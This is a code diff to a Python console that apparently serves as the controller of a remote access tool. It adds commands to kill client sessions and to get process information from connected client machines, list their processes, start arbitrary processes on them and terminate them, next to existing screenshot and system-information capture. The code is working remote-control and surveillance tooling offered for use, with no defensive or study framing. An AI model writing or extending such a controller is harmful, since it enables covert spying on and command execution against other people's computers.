@@ -150,12 +150,41 @@ def process_command(command):
         print(f"  {Fore.YELLOW}stop{Style.RESET_ALL}              - Stop the server")
         print(f"  {Fore.YELLOW}list{Style.RESET_ALL}              - List all connected clients")
         print(f"  {Fore.YELLOW}select <id>{Style.RESET_ALL}       - Select a client to interact with")
+        print(f"  {Fore.YELLOW}kill <id>{Style.RESET_ALL}         - Force terminate a client session")
+        print(f"  {Fore.YELLOW}procinfo{Style.RESET_ALL}          - Get process information from selected client")
+        print(f"  {Fore.YELLOW}list_processes{Style.RESET_ALL}    - List all running processes on selected client")
+        print(f"  {Fore.YELLOW}start_process <cmd>{Style.RESET_ALL} - Start a new process on selected client")
+        print(f"  {Fore.YELLOW}terminate_process <pid>{Style.RESET_ALL} - Terminate a process on selected client")
         print(f"  {Fore.YELLOW}sysinfo{Style.RESET_ALL}           - Get detailed system information from selected client")
         print(f"  {Fore.YELLOW}screenshot{Style.RESET_ALL}        - Capture and download screenshot from client")
         print(f"  {Fore.YELLOW}exit{Style.RESET_ALL}              - Close connection with selected client")
         print(f"  {Fore.YELLOW}clear{Style.RESET_ALL}             - Clear the screen")
         print(f"  {Fore.YELLOW}options{Style.RESET_ALL}           - Configure server options")
         print(f"  {Fore.YELLOW}quit{Style.RESET_ALL}              - Exit the program")
+    
+    # Add kill command
+    elif command.startswith("kill "):
+        if not server_running:
+            print(f"{Fore.RED}Server is not running{Style.RESET_ALL}")
+        else:
+            try:
+                client_id = int(command.split(" ")[1])
+                if 0 <= client_id < MAX_CLIENTS and client_sockets[client_id]:
+                    # Send kill command to client
+                    try:
+                        client_sockets[client_id].send("kill_client".encode())
+                        print(f"{Fore.RED}Kill command sent to client {client_id}{Style.RESET_ALL}")
+                        # Wait a moment for the command to be processed
+                        time.sleep(1)
+                        # Then disconnect the client
+                        handle_client_disconnect(client_id)
+                    except:
+                        print(f"{Fore.RED}Error sending kill command to client {client_id}{Style.RESET_ALL}")
+                        handle_client_disconnect(client_id)
+                else:
+                    print(f"{Fore.RED}Invalid client ID{Style.RESET_ALL}")
+            except (ValueError, IndexError):
+                print(f"{Fore.RED}Invalid command format. Use 'kill <id>'{Style.RESET_ALL}")
     
     elif command == "start":
         start_server()
@@ -424,11 +453,11 @@ def process_menu_choice(choice):
     return True
 
 def client_command_mode():
-    """Enter command mode for the selected client"""
+    """Enter client command mode for the active client"""
     global active_client
     
-    if active_client < 0:
-        print(f"{Fore.RED}No client selected{Style.RESET_ALL}")
+    if active_client < 0 or not server_running:
+        print(f"{Fore.RED}No client selected or server not running{Style.RESET_ALL}")
         return
     
     clear_screen()
@@ -459,6 +488,56 @@ def client_command_mode():
                 print(f"{Fore.YELLOW}Type 'help' to see available commands{Style.RESET_ALL}")
                 print(f"\n{Fore.CYAN}=== OUTPUT ==={Style.RESET_ALL}")
                 continue
+            
+            # Handle kill command in client mode
+            if command.lower() == "kill":
+                try:
+                    client_sockets[active_client].send("kill_client".encode())
+                    print(f"{Fore.RED}Kill command sent to client {active_client}{Style.RESET_ALL}")
+                    time.sleep(1)  # Wait a moment for the command to be processed
+                    handle_client_disconnect(active_client)
+                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
+                    break
+                except:
+                    print(f"{Fore.RED}Error sending kill command to client {active_client}{Style.RESET_ALL}")
+                    handle_client_disconnect(active_client)
+                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
+                    break
+            
+            # Handle procinfo command
+            if command.lower() == "procinfo":
+                try:
+                    client_sockets[active_client].send("procinfo".encode())
+                    print(f"{Fore.CYAN}Requesting process information from client {active_client}...{Style.RESET_ALL}")
+                    
+                    # Receive response
+                    client_sockets[active_client].settimeout(10.0)
+                    try:
+                        response = client_sockets[active_client].recv(BUFFER_SIZE).decode()
+                        if not response:
+                            print(f"{Fore.RED}Client {active_client} disconnected{Style.RESET_ALL}")
+                            handle_client_disconnect(active_client)
+                            input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
+                            break
+                        
+                        print(f"\n{Fore.CYAN}Process Information:{Style.RESET_ALL}")
+                        print(response)
+                    except socket.timeout:
+                        print(f"{Fore.RED}Timeout waiting for response from client {active_client}{Style.RESET_ALL}")
+                    except:
+                        print(f"{Fore.RED}Error receiving response from client {active_client}{Style.RESET_ALL}")
+                        handle_client_disconnect(active_client)
+                        input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
+                        break
+                    finally:
+                        client_sockets[active_client].settimeout(None)
+                    
+                    continue
+                except:
+                    print(f"{Fore.RED}Error sending command to client {active_client}{Style.RESET_ALL}")
+                    handle_client_disconnect(active_client)
+                    input(f"\n{Fore.YELLOW}Press Enter to return to main menu...{Style.RESET_ALL}")
+                    break
             
             # Send command to active client
             try:
@@ -528,7 +607,12 @@ def show_client_commands():
     """Display available commands for client interaction"""
     print(f"{Fore.CYAN}Available commands in client command mode:{Style.RESET_ALL}")
     print(f"  {Fore.YELLOW}sysinfo{Style.RESET_ALL}           - Get detailed system information from selected client")
+    print(f"  {Fore.YELLOW}procinfo{Style.RESET_ALL}          - Get process information from selected client")
+    print(f"  {Fore.YELLOW}list_processes{Style.RESET_ALL}    - List all running processes on selected client")
+    print(f"  {Fore.YELLOW}start_process <cmd>{Style.RESET_ALL} - Start a new process on selected client")
+    print(f"  {Fore.YELLOW}terminate_process <pid>{Style.RESET_ALL} - Terminate a process on selected client")
     print(f"  {Fore.YELLOW}screenshot{Style.RESET_ALL}        - Capture and download screenshot from client")
+    print(f"  {Fore.YELLOW}kill{Style.RESET_ALL}              - Force terminate the client process")
     print(f"  {Fore.YELLOW}exit{Style.RESET_ALL}              - Close connection with selected client")
     print(f"  {Fore.YELLOW}back{Style.RESET_ALL}              - Return to main menu")
     print(f"  {Fore.YELLOW}clear{Style.RESET_ALL}             - Clear the screen")
@@ -599,6 +683,7 @@ def main():
 # Call the main function when the script is executed
 if __name__ == "__main__":
     main()
+
 
 
 
